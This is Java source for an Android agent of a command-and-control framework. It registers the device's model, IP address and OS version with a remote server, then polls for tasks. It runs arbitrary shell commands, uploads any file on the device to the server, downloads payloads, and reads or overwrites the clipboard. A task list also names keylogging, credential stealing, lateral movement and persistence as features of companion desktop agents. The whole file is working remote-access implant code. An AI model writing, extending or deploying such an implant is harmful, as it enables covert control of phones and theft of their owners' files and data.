package com.wym.c2;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.SystemClock;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Wire-protocol agent core (register -> checkin -> execute -> result) running
 * on an Android background thread. Implements the subset that makes sense on
 * Android; unsupported task types report a clear "not supported" string,
 * mirroring the macOS behavior of the desktop agents.
 */
public final class WymAgent implements Runnable {

    private static final String TAG = "wym-agent";
    private static final String PREF_ID = "agent_id";
    private static final int TIMEOUT_MS = 15000;

    private final Context ctx;
    private final Runnable onExit;
    private final AtomicBoolean running = new AtomicBoolean(true);
    private String agentId;
    private volatile long intervalMs;

    public WymAgent(Context ctx, Runnable onExit) {
        this.ctx = ctx.getApplicationContext();
        this.onExit = onExit;
        this.intervalMs = Config.INTERVAL_SECONDS * 1000L;
        this.agentId = prefs().getString(PREF_ID, "");
    }

    private SharedPreferences prefs() {
        return ctx.getSharedPreferences("wym", Context.MODE_PRIVATE);
    }

    private void saveId() {
        prefs().edit().putString(PREF_ID, agentId == null ? "" : agentId).apply();
    }

    @Override
    public void run() {
        Log.i(TAG, "agent started, server=" + Config.SERVER_URL);
        while (running.get()) {
            try {
                if (agentId == null || agentId.isEmpty()) {
                    register();
                }
                String body = postJson("/api/checkin", new JSONObject().put("agent_id", agentId));
                if (body == null) {
                    // 404 -> id lost server-side, re-register on next loop
                    agentId = "";
                    Thread.sleep(3000);
                    continue;
                }
                JSONObject resp = new JSONObject(body);
                if (resp.has("tasks")) {
                    org.json.JSONArray tasks = resp.getJSONArray("tasks");
                    for (int i = 0; i < tasks.length(); i++) {
                        JSONObject task = tasks.getJSONObject(i);
                        execute(task);
                    }
                }
            } catch (InterruptedException ie) {
                break;
            } catch (Exception e) {
                Log.w(TAG, "loop error: " + e);
            }
            sleepQuiet(Math.max(1000L, intervalMs));
        }
        Log.i(TAG, "agent stopping");
        if (onExit != null) {
            onExit.run();
        }
    }

    // ------------------------------------------------------------------
    private static String readAll(InputStream in) throws IOException {
        if (in == null) return "";
        StringBuilder sb = new StringBuilder();
        try (BufferedReader r = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8))) {
            char[] buf = new char[4096];
            int n;
            while ((n = r.read(buf)) > 0) {
                sb.append(buf, 0, n);
            }
        }
        return sb.toString();
    }

    private HttpURLConnection open(String path) throws IOException {
        HttpURLConnection c = (HttpURLConnection) new URL(Config.SERVER_URL + path).openConnection();
        c.setRequestProperty("X-Agent-Token", Config.AGENT_TOKEN);
        c.setConnectTimeout(TIMEOUT_MS);
        c.setReadTimeout(60000);
        return c;
    }

    /** POST JSON, return response text, or null on 404 (re-register). */
    private String postJson(String path, JSONObject body) throws IOException {
        HttpURLConnection c = open(path);
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/json");
        byte[] data = body.toString().getBytes(StandardCharsets.UTF_8);
        try (OutputStream os = c.getOutputStream()) {
            os.write(data);
            os.flush();
        }
        int code = c.getResponseCode();
        InputStream in = code >= 200 && code < 300 ? c.getInputStream() : c.getErrorStream();
        String text = readAll(in);
        c.disconnect();
        if (code == 404) {
            return null;
        }
        if (code < 200 || code >= 300) {
            throw new IOException("HTTP " + code + " " + text);
        }
        return text;
    }

    /** POST a complete result body for ONE task. */
    private void postResult(String taskId, String output, int exitCode, String error) {
        try {
            JSONObject body = new JSONObject()
                    .put("agent_id", agentId == null ? "" : agentId)
                    .put("task_id", taskId)
                    .put("output", output == null ? "" : output)
                    .put("exit_code", exitCode)
                    .put("error", error == null ? "" : error);
            postJson("/api/result", body);
        } catch (Exception e) {
            Log.w(TAG, "result post failed: " + e);
        }
    }

    private void register() {
        try {
            JSONObject body = new JSONObject()
                    .put("agent_id", agentId == null ? "" : agentId)
                    .put("hostname", android.os.Build.MODEL)
                    .put("username", "android-" + android.os.Build.ID)
                    .put("os", "android")
                    .put("arch", android.os.Build.SUPPORTED_ABIS.length > 0 ? android.os.Build.SUPPORTED_ABIS[0] : System.getProperty("os.arch", ""))
                    .put("pid", android.os.Process.myPid())
                    .put("ip", getLocalIp())
                    .put("os_version", android.os.Build.VERSION.RELEASE)
                    .put("version", "1.1")
                    .put("type", "Android");
            String resp = postJson("/api/register", body);
            if (resp == null) {
                return;
            }
            agentId = new JSONObject(resp).getString("agent_id");
            saveId();
        } catch (Exception e) {
            Log.w(TAG, "register failed: " + e);
        }
    }

    private static String getLocalIp() {
        try {
            java.util.Enumeration<java.net.NetworkInterface> ifs =
                    java.net.NetworkInterface.getNetworkInterfaces();
            while (ifs != null && ifs.hasMoreElements()) {
                java.net.NetworkInterface n = ifs.nextElement();
                if (!n.isUp() || n.isLoopback()) continue;
                java.util.Enumeration<java.net.InetAddress> addrs = n.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    java.net.InetAddress a = addrs.nextElement();
                    if (a instanceof java.net.Inet4Address) {
                        return a.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return "";
    }

    private void execute(JSONObject task) {
        String taskId = task.optString("task_id", "");
        String type = task.optString("type", "");
        JSONObject args = task.optJSONObject("args");
        try {
            if (type.equals("shell")) {
                String cmd = args == null ? "" : args.optString("command", "");
                int timeout = args == null ? 120 : clamp(args.optInt("timeout", 120), 1, 3600);
                ShellResult sr = runShell(cmd, timeout);
                postResult(taskId, sr.output, sr.exitCode, "");
            } else if (type.equals("download")) {
                download(taskId, args);
            } else if (type.equals("upload")) {
                upload(taskId, args);
            } else if (type.equals("sleep")) {
                int secs = args == null ? 10 : Math.max(1, args.optInt("seconds", 10));
                intervalMs = secs * 1000L;
                postResult(taskId, "heartbeat interval set to " + secs + "s", 0, "");
            } else if (type.equals("clipboard")) {
                clipboard(taskId, args);
            } else if (type.equals("exit")) {
                postResult(taskId, "bye", 0, "");
                running.set(false);
            } else {
                String[] deny = {"keylog", "screenshot", "steal", "lateral", "clone", "persistence"};
                boolean unsupported = false;
                for (String d : deny) {
                    if (d.equals(type)) {
                        unsupported = true;
                        break;
                    }
                }
                postResult(taskId, unsupported ? "error: " + type + " not supported on Android"
                        : "unknown task type: " + type, unsupported ? 1 : 2, "");
            }
        } catch (Exception e) {
            postResult(taskId, "error: " + e, 1, "");
        }
    }

    private static int clamp(int v, int lo, int hi) {
        return Math.max(lo, Math.min(hi, v));
    }

    private static class ShellResult {
        final String output;
        final int exitCode;
        ShellResult(String output, int exitCode) {
            this.output = output;
            this.exitCode = exitCode;
        }
    }

    private ShellResult runShell(String command, int timeoutSec) {
        if (command == null || command.isEmpty()) {
            return new ShellResult("error: empty command", 1);
        }
        Process p = null;
        try {
            p = new ProcessBuilder("/system/bin/sh", "-c", command)
                    .redirectErrorStream(true).start();
            final StringBuilder out = new StringBuilder();
            final InputStream is = p.getInputStream();
            Thread reader = new Thread(() -> {
                try (BufferedReader r = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
                    char[] buf = new char[2048];
                    int n;
                    while ((n = r.read(buf)) != -1) {
                        synchronized (out) {
                            if (out.length() < 8000) out.append(buf, 0, n);
                        }
                    }
                } catch (IOException ignored) {}
            });
            reader.start();

            boolean finished = false;
            long deadline = System.currentTimeMillis() + (timeoutSec * 1000L);
            while (System.currentTimeMillis() < deadline) {
                try {
                    p.exitValue();
                    finished = true;
                    break;
                } catch (IllegalThreadStateException e) {
                    Thread.sleep(100);
                }
            }

            if (!finished) {
                p.destroy();
                reader.join(500);
                String text;
                synchronized (out) { text = out.toString(); }
                return new ShellResult("command timed out (" + timeoutSec + "s)\n" + text.trim(), 124);
            }
            reader.join(1000);
            int code = p.exitValue();
            String text;
            synchronized (out) { text = out.toString(); }
            String status = code != 0 ? "command failed (exit code " + code + ")\n" : "";
            return new ShellResult(status + text.trim(), code);
        } catch (Exception e) {
            return new ShellResult("error: " + e, 1);
        } finally {
            if (p != null) p.destroy();
        }
    }

    private void download(String taskId, JSONObject args) {
        try {
            String fname = args == null ? "payload.bin" : args.optString("file", "payload.bin");
            String dest = args == null ? "" : args.optString("destination", "");
            HttpURLConnection c = open("/api/files/" + taskId);
            c.setRequestMethod("GET");
            c.setReadTimeout(120000);
            int code = c.getResponseCode();
            if (code != 200) {
                postResult(taskId, "download failed: HTTP " + code, 1, "");
                c.disconnect();
                return;
            }
            InputStream in = c.getInputStream();
            File target;
            File destFile = dest.isEmpty() ? null : new File(dest);
            if (destFile != null && destFile.isDirectory()) {
                target = new File(destFile, fname);
            } else if (destFile != null && destFile.getParentFile() != null) {
                target = destFile;
            } else {
                target = new File(ctx.getFilesDir(), fname);
            }
            if (target.getParentFile() != null) {
                target.getParentFile().mkdirs();
            }
            long size = 0;
            try (FileOutputStream fo = new FileOutputStream(target)) {
                byte[] buf = new byte[65536];
                int n;
                while ((n = in.read(buf)) > 0) {
                    fo.write(buf, 0, n);
                    size += n;
                }
            }
            in.close();
            c.disconnect();
            postResult(taskId, "saved " + size + " bytes to " + target.getAbsolutePath(), 0, "");
        } catch (Exception e) {
            postResult(taskId, "error: " + e, 1, "");
        }
    }

    private void upload(String taskId, JSONObject args) {
        String path = args == null ? "" : args.optString("path", "");
        File f = new File(path);
        if (!f.isFile()) {
            postResult(taskId, "file not found: " + path, 1, "");
            return;
        }
        try {
            String boundary = "----wym" + Long.toHexString(System.currentTimeMillis());
            HttpURLConnection c = open("/api/files/" + taskId);
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            c.setReadTimeout(300000);
            OutputStream os = c.getOutputStream();
            OutputStreamWriter w = new OutputStreamWriter(os, StandardCharsets.UTF_8);
            w.write("--" + boundary + "\r\n");
            w.write("Content-Disposition: form-data; name=\"file\"; filename=\"" + f.getName() + "\"\r\n");
            w.write("Content-Type: application/octet-stream\r\n\r\n");
            w.flush();
            try (FileInputStream fi = new FileInputStream(f)) {
                byte[] buf = new byte[65536];
                int n;
                while ((n = fi.read(buf)) > 0) {
                    os.write(buf, 0, n);
                }
            }
            w.write("\r\n--" + boundary + "--\r\n");
            w.flush();
            os.close();
            int code = c.getResponseCode();
            InputStream in = code >= 200 && code < 300 ? c.getInputStream() : c.getErrorStream();
            String body = in == null ? "" : readAll(in);
            c.disconnect();
            postResult(taskId, code < 300 ? "uploaded " + path : "upload failed: HTTP " + code + " " + body,
                    code < 300 ? 0 : 1, "");
        } catch (Exception e) {
            postResult(taskId, "error: " + e, 1, "");
        }
    }

    private void clipboard(String taskId, JSONObject args) {
        try {
            String action = args == null ? "get" : args.optString("action", "get");
            android.content.ClipboardManager cm =
                    (android.content.ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (action.equals("set")) {
                String text = args == null ? "" : args.optString("text", "");
                cm.setPrimaryClip(android.content.ClipData.newPlainText("wym", text));
                postResult(taskId, "clipboard set", 0, "");
                return;
            }
            String text = cm.getPrimaryClip() != null && cm.getPrimaryClip().getItemCount() > 0
                    ? String.valueOf(cm.getPrimaryClip().getItemAt(0).coerceToText(ctx)) : "";
            postResult(taskId, text, 0, "");
        } catch (Exception e) {
            postResult(taskId, "error: " + e, 1, "");
        }
    }

    private void sleepQuiet(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    public void stop() {
        running.set(false);
    }
}